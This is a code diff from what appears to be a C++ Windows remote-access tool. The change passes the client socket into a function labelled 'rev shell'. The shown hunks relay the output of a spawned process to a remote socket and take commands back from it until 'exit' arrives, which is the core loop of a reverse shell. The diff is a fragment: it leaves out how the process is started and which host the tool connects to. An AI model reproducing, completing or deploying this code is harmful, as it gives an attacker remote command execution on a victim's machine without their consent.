@@ -23,7 +23,7 @@ string receive_data(SOCKET clientSocket);
 
 bool ExecuteCommand(const std::string& command);
 void give_command(const std::string &command);
-void rev_shell();
+void rev_shell(SOCKET clientSocket);
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 void safe_closesocket(SOCKET& s) {
@@ -36,7 +36,7 @@ void safe_closesocket(SOCKET& s) {
 
 int main()
 {
-    //SOCKET sock = INVALID_SOCKET;
+    SOCKET sock = INVALID_SOCKET;
 
     bool outerloop = true;
     while(outerloop)
@@ -105,7 +105,7 @@ int main()
             {
                 case 2:                                                                                         //rev shell
                 {
-                    rev_shell();
+                    rev_shell(sock);
                     break;
                 }
 
@@ -237,7 +237,7 @@ string receive_data(SOCKET clientSocket)
     return ""; // Return an empty string in case of error or connection closure
 }
 
-void rev_shell()
+void rev_shell(SOCKET clientSocket)
 {
 
     SECURITY_ATTRIBUTES saAttr = {0};
@@ -290,7 +290,7 @@ void rev_shell()
                 {
                     buffer[bytesRead] = '\0';
                     cout << buffer;
-                    send_data(sock, buffer);
+                    send_data(clientSocket, buffer);
                 }
             } 
             else if (GetLastError() == ERROR_BROKEN_PIPE)
@@ -308,7 +308,7 @@ void rev_shell()
         string cmd;
         while (!processFinished.load())  // Check if process is finished
         {
-            cmd = receive_data(sock);
+            cmd = receive_data(clientSocket);
             if (cmd == "exit")
             {
                 processFinished.store(true); // Signal to stop reading thread
